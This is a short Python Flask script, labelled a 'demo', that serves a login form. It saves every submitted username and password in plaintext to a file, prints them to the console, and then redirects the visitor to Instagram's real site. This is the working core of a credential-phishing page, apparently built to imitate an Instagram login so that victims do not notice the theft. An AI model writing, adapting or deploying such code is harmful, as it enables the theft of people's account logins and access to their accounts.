from flask import Flask, render_template, request, redirect, url_for

app = Flask(__name__)

@app.route("/", methods=["GET", "POST"])
def login():

    username = ""
    password = ""

    if request.method == "POST":
        username = request.form.get("username", "")
        password = request.form.get("password", "")

        with open("demo.txt", "a") as file:
            file.write(f"Username: {username}\n")
            file.write(f"Password: {password}\n")
            file.write("-" * 30 + "\n")

        print("Demo Data Received")
        print("Username:", username)
        print("Password:", password)

        return redirect(url_for("demo_done"))

    return render_template("login.html")


@app.route("/demo_done")
def demo_done():
    return redirect("https://www.instagram.com/", code=302)

if __name__ == "__main__":
    app.run(debug=True)
